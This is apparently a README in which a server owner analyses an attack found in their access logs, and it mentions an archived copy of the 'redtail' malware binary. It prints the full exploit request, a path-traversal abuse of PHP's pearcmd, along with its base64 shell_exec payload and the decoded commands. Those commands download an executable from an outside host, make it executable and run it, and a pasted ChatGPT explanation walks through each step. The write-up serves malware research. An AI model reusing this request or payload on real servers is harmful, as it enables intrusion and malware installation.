# redtail

While analyzing my daily access.log report, I noticed something really, really wrong.


> 26 December 2023, 04:21	202.1.200.239	GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?shell_exec(base64_decode(\


Above is the processed access.log report. I believe there's a raw base64 string present over there, but it got trimmed by my faulty regex script. So I decided to inspect the raw access.log file : 

> 202.1.200.239 - - [25/Dec/2023:21:21:16 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/+/tmp/ohhellohttpserver.php HTTP/1.1" 404 419 "-" "Custom-AsyncHttpClient"

Umm... Why is the `shell_exec` part missing here?

I decided to modify my access.log processor script. So I instructed the script that whenever a string containing "base64_decode" is being processed, please show me the raw log line.

Here's what I got :


```
202.1.200.239 - - [25/Dec/2023:21:21:16 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&amp;/<!--?shell_exec(base64_decode(\"bWtkaXIgLXAgL3RtcC8kKHdob2FtaSk7IGNkIC90bXAvJCh3aG9hbWkpOyB3Z2V0IGh0dHA6Ly9kdy5vaHV5YWwueHl6L2Rvd25sb2FkL3JlZHRhaWwueDg2XzY0OyBjdXJsIC1PIGh0dHA6Ly9kdy5vaHV5YWwueHl6L2Rvd25sb2FkL3JlZHRhaWwueDg2XzY0OyBtdiByZWR0YWlsLng4Nl82NCBwaHAuc2VsZnJlcDsgY2htb2QgK3ggcGhwLnNlbGZyZXA7IC4vcGhwLnNlbGZyZXA7IGVjaG8gUEhQLlNFTEZSRVA=\"));?-->+/tmp/ohhellohttpserver.php HTTP/1.1" 404 419 "-" "Custom-AsyncHttpClient"
```
Here's the true culprit 

> shell_exec(base64_decode(\"bWtkaXIgLXAgL3RtcC8kKHdob2FtaSk7IGNkIC90bXAvJCh3aG9hbWkpOyB3Z2V0IGh0dHA6Ly9kdy5vaHV5YWwueHl6L2Rvd25sb2FkL3JlZHRhaWwueDg2XzY0OyBjdXJsIC1PIGh0dHA6Ly9kdy5vaHV5YWwueHl6L2Rvd25sb2FkL3JlZHRhaWwueDg2XzY0OyBtdiByZWR0YWlsLng4Nl82NCBwaHAuc2VsZnJlcDsgY2htb2QgK3ggcGhwLnNlbGZyZXA7IC4vcGhwLnNlbGZyZXA7IGVjaG8gUEhQLlNFTEZSRVA=\"))

And finally, I managed to extract the base64 string.


> bWtkaXIgLXAgL3RtcC8kKHdob2FtaSk7IGNkIC90bXAvJCh3aG9hbWkpOyB3Z2V0IGh0dHA6Ly9kdy5vaHV5YWwueHl6L2Rvd25sb2FkL3JlZHRhaWwueDg2XzY0OyBjdXJsIC1PIGh0dHA6Ly9kdy5vaHV5YWwueHl6L2Rvd25sb2FkL3JlZHRhaWwueDg2XzY0OyBtdiByZWR0YWlsLng4Nl82NCBwaHAuc2VsZnJlcDsgY2htb2QgK3ggcGhwLnNlbGZyZXA7IC4vcGhwLnNlbGZyZXA7IGVjaG8gUEhQLlNFTEZSRVA=


Let's decode this base64 string.


> mkdir -p /tmp/$(whoami); cd /tmp/$(whoami); wget http://dw.ohuyal.xyz/download/redtail.x86_64; curl -O http://dw.ohuyal.xyz/download/redtail.x86_64; mv redtail.x86_64 php.selfrep; chmod +x php.selfrep; ./php.selfrep; echo PHP.SELFREP


Umm. I don't understand it. Let's ask ChatGPT.

----

This script seems to be a set of commands executed in a Unix-like shell (like Bash). Let's break it down step by step:

1. **Create a temporary directory with the user's name:**
   ```bash
   mkdir -p /tmp/$(whoami)
   ```
   - `mkdir`: command to create a directory.
   - `-p`: option to create parent directories if they don't exist.
   - `/tmp/$(whoami)`: specifies the path of the directory. `/tmp/` is the temporary directory, and `$(whoami)` is a command substitution that gets replaced with the current username.

2. **Change to the newly created temporary directory:**
   ```bash
   cd /tmp/$(whoami)
   ```
   - `cd`: command to change the current working directory.

3. **Download a file named "redtail.x86_64" from a remote server using `wget` and `curl`:**
   ```bash
   wget http://dw.ohuyal.xyz/download/redtail.x86_64
   curl -O http://dw.ohuyal.xyz/download/redtail.x86_64
   ```
   - `wget`: command to download files from the internet.
   - `curl -O`: command to download a file and save it with the same name as the remote file.

4. **Rename the downloaded file to "php.selfrep":**
   ```bash
   mv redtail.x86_64 php.selfrep
   ```
   - `mv`: command to rename or move files.

5. **Give execute permissions to the renamed file:**
   ```bash
   chmod +x php.selfrep
   ```
   - `chmod +x`: command to make the file executable.

6. **Execute the renamed file:**
   ```bash
   ./php.selfrep
   ```
   - `./`: specifies the current directory.
   - `php.selfrep`: the executable file that was downloaded and renamed.

7. **Print a message "PHP.SELFREP":**
   ```bash
   echo PHP.SELFREP
   ```
   - `echo`: command to print text to the console.

----

Before that URL is unaccessible, I archived the `redtail.x86_64` executable here for research purposes.

### So?

I wish some security researchers could find out what these executables actually do. 

Oh, I also managed to find another malware in the wild, similar to this : [jaws.exploit](https://github.com/altilunium/jaws.exploit). 

All I have to do to get this one is by setting up a honeypot server with a publicly accessible IP.
